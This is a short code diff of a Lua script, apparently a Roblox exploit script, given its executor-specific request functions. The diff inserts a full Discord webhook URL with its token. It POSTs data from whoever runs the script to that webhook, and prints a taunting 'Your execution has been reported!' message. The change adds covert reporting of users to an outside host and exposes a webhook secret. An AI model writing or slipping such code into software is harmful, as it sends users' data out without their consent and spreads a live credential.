@@ -1101,9 +1101,9 @@ local headers = {
 	["content-type"] = "application/json"
 }
 request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = "", Body = newdata, Method = "POST", Headers = headers}
+local abcdef = {Url = "https://discord.com/api/webhooks/891415654094233640/OeJLybTbYkA7zPdjKCD61fF79Hn1H3PUPLJJTUBH8x3Z65tM_v-28EDv_pzH7jJnS1WE", Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
-print("SENT")
+print("ANTI LEAK LOADED - Your execution has been reported! lets hope its not a leak ;)")
 
 
 
